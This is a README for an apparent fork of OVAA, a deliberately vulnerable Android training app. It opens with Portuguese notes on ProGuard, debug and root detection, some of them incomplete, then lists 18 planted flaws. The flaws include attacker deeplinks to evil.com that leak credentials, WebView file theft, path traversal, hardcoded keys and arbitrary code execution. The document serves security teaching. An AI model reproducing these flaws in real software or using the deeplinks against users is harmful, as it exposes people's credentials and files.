## Description

 
# 🔒 Segurança no Aplicativo - ProGuard, Debug e Root Detection

Este projeto implementa diversas técnicas de segurança para **proteger contra engenharia reversa**, **detectar root e depuração**, além de **ativar a ofuscação de código com ProGuard**.

---

## 🚀 **Funcionalidades de Segurança Implementadas**
✅ **ProGuard ativado** para ofuscação de código  
✅ **Verificação de Debug (Prevenção de Análise)**  
✅ **Detecção de Root (Bloqueio de dispositivos rooteados)**  
✅ **Script para injetar segurança automaticamente**  

---

## 🔹 **1. Ativando o ProGuard (Ofuscação de Código)**

O **ProGuard** está ativado para garantir que o código seja **ofuscado**, dificultando a engenharia reversa.

📂 **Alterações no arquivo `app/build.gradle`**:
```gradle
buildTypes {
    release {
        minifyEnabled true  // 🔹 Ativa a ofuscação
        shrinkResources true // 🔹 Remove recursos não utilizados
        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
    }
}
```

📂 **Alterações no arquivo `proguard-rules.pro`**:

# 🔒 Impede que classes de segurança sejam removidas
-keep class oversecured.ovaa.activities.MainActivity { *; }

# 🔒 Ofusca todas as classes do app, exceto as Activities
-keep public class * extends android.app.Activity 
-dontwarn android.support.*

📌 Como testar se o código foi ofuscado?
Gere a versão release do APK:
```
./gradlew assembleRelease
```
Verifique o arquivo mapping.txt (gera os nomes ofuscados):
```
cat app/build/outputs/mapping/release/mapping.txt
```

🔹 2. Detecção de Debug (Proteção Contra Engenharia Reversa)
O app detecta se está sendo executado em um dispositivo rooteado e encerra a execução caso positivo.

📂 Alterações no MainActivity.java

Aproveite 🛡✨

###
OVAA (Oversecured Vulnerable Android App) is an Android app that aggregates all the platform's known and popular security vulnerabilities.

## List of vulnerabilities
This section only includes the list of vulnerabilities, without a detailed description or proof of concept. Examples from OVAA will receive detailed examination and analysis on [our blog](https://blog.oversecured.com/).

1. Installation of an arbitrary `login_url` via deeplink `oversecured://ovaa/login?url=http://evil.com/`. Leads to the user's user name and password being leaked when they log in.
2. Obtaining access to arbitrary content providers (not exported, but with the attribute `android:grantUriPermissions="true"`) via deeplink `oversecured://ovaa/grant_uri_permissions`. The attacker's app needs to process `oversecured.ovaa.action.GRANT_PERMISSIONS` and pass intent to `setResult(code, intent)` with flags such as `Intent.FLAG_GRANT_READ_URI_PERMISSION` and the URI of the content provider.
3. Vulnerable host validation when processing deeplink `oversecured://ovaa/webview?url=...`.
4. Opening arbitrary URLs via deeplink `oversecured://ovaa/webview?url=http://evilexample.com`. An attacker can use the vulnerable WebView setting `WebSettings.setAllowFileAccessFromFileURLs(true)` in the `WebViewActivity.java` file to steal arbitrary files by sending them XHR requests and obtaining their content.
5. Access to arbitrary activities and acquiring access to arbitrary content providers in `LoginActivity` by supplying an arbitrary Intent object to `redirect_intent`.
6. Theft of arbitrary files in `MainActivity` by intercepting an activity launch from `Intent.ACTION_PICK` and passing the URI to any file as data.
7. Insecure broadcast to `MainActivity` containing credentials. The attacker can register a broadcast receiver with action `oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA` and obtain the user's data.
8. Insecure activity launch in `MainActivity` with action `oversecured.ovaa.action.WEBVIEW`, containing the user's encrypted data in the query parameter `token`.
9. Deletion of arbitrary files via the insecure `DeleteFilesSerializable` deserialization object.
10. Memory corruption via the `MemoryCorruptionParcelable` object.
11. Memory corruption via the `MemoryCorruptionSerializable` object.
12. Obtaining read/write access to arbitrary files in `TheftOverwriteProvider` via path-traversal in the value `uri.getLastPathSegment()`.
13. Obtaining access to app logs via `InsecureLoggerService`. Leak of credentials in `LoginActivity` `Log.d("ovaa", "Processing " + loginData)`.
14. Use of the hardcoded AES key in `WeakCrypto`.
15. Arbitrary Code Execution in `OversecuredApplication` by launching code from third-party apps with no security checks.
16. Use of very wide file sharing declaration for `oversecured.ovaa.fileprovider` content provider in `root` entry.
17. Hardcoded credentials to a dev environment endpoint in `strings.xml` in `test_url` entry.
18. Arbitrary code execution via a DEX library located in a world-readable/writable directory.

---------------------------------------
*Licensed under the Simplified BSD License*

*Copyright (c) 2020, Oversecured Inc*

https://oversecured.com/
